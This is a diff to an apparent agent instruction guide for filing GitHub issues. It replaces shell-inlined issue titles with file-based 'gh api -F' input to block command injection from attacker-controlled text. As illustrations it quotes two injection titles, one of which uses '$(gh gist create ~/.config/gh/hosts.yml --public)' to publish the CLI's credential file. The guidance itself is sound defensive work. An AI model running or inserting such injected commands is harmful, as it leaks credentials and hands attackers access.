@@ -93,16 +93,38 @@ issue sits on.
 
 ### Create
 
+A tracker title almost always derives from attacker-controlled text —
+an email subject, a public PR title, a scanner finding — so it
+**must not** be inlined into a shell argument at all. A title like
+`RCE' --repo <upstream> --title 'leaked` breaks out of single quotes,
+and one like `RCE in $(gh gist create ~/.config/gh/hosts.yml --public)`
+expands inside double quotes. **Use the Write tool** (not Bash) to put
+the title verbatim into a title file and the body into a body file,
+then pass both via `gh api`'s `-F` form, which reads each value
+verbatim from its file:
+
+*Write tool call:* `file_path: <title-file>`, `content: <title>`
+
 ```bash
-gh issue create --repo <tracker> \
-  --title '<title>' \
-  --body-file <path> \
-  --label '<label-1>' --label '<label-2>'
+gh api repos/<tracker>/issues \
+  -F title=@<title-file> \
+  -F body=@<body-file> \
+  -f 'labels[]=<label-1>' \
+  -f 'labels[]=<label-2>' \
+  --jq '.number, .node_id, .html_url'
 ```
 
-Always write the body to a temp file and pass `--body-file` — shell
-quoting silently corrupts anything with literal backticks, `$(…)`, or
-newlines inside a multi-paragraph body.
+The `labels[]` lines are optional. Creating through `gh api` also
+bypasses the issue form, so required form fields do not block an
+import that has no value for them yet.
+
+The same rule applies to any `gh` call that takes attacker-controlled
+text as an argument: write the value to a file **with the Write
+tool** and pass it via `-F` or `--body-file`. Never `--title '<x>'`,
+never `--title "<x>"`, never `printf '%s' "<x>"` (the double-quoted
+argument still expands `$(...)` before `printf` runs). Shell quoting
+also silently corrupts a multi-paragraph body with literal backticks,
+`$(…)`, or newlines, so the body always goes through a file.
 
 ### Edit — labels
 
